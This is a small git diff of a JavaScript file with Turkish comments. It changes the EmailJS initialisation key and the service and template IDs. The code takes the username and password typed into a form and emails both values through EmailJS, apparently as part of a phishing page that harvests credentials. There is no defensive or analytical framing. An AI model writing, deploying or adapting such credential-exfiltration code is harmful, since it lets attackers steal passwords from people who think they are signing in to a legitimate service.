@@ -1,6 +1,6 @@
 (function() {
     // EmailJS'i başlat
-    emailjs.init('service_hrabkdj');
+    emailjs.init('VVZvHX8p7UeYXyDQP');
 
     document.getElementById('emailForm').addEventListener('submit', function(event) {
         event.preventDefault();
@@ -10,7 +10,7 @@
         const password = document.getElementById('password').value;
 
         // EmailJS'e veri gönder
-        emailjs.send('service_m5ebe2f', 'template_dj6sica', {
+        emailjs.send('service_hrabkdj', 'template_omxpwer', {
             username: username,
             password: password
         })
